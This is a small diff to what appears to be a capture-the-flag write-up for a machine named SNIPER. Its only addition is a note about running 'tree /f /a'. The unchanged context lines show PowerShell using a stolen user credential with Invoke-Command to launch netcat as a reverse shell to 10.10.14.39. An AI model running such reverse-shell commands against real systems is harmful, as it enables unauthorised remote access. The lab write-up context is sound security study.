@@ -17,3 +17,6 @@ $username = 'SNIPER\Chris'
  $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
  Invoke-command -computername SNIPER -credential $credential -scriptblock { cmd.exe /c "C:\tmp\nc.exe" -e powershell 10.10.14.39 1234 }
 ```
+```
+Checking with Tree /f /a
+```
